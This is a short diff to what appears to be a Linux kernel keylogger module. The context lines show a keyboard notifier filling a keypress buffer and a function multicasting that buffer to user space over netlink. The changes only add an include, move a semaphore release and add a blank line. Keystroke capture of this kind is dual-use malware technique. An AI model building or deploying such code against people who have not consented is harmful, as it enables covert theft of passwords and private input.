@@ -1,3 +1,4 @@
+#include <linux/delay.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/keyboard.h>
@@ -161,9 +162,9 @@ static int kb_notify(struct notifier_block *nblock, unsigned long action, void *
             //pr_info("Keypress buffer: %s\n", keypress_buff);
 
             /* Send the keypress packet to user space */
+            up(&sem);
             nl_send_msg();
         }
-        up(&sem);
     }
     return NOTIFY_OK;
 }
@@ -198,6 +199,7 @@ static void nl_send_msg(void)
     //nlh->nlmsg_pid = 0;     [> from kernel <]
     //nlh->nlmsg_flags = 0;
     nlh = nlmsg_put(skb_out, 0, 1, NLMSG_DONE, msg_size, 0);
+
     strncpy(nlmsg_data(nlh), keypress_buff, msg_size);
 
     if ((res = nlmsg_multicast(nl_sk, skb_out, 0, MYGRP, GFP_KERNEL)) < 0)
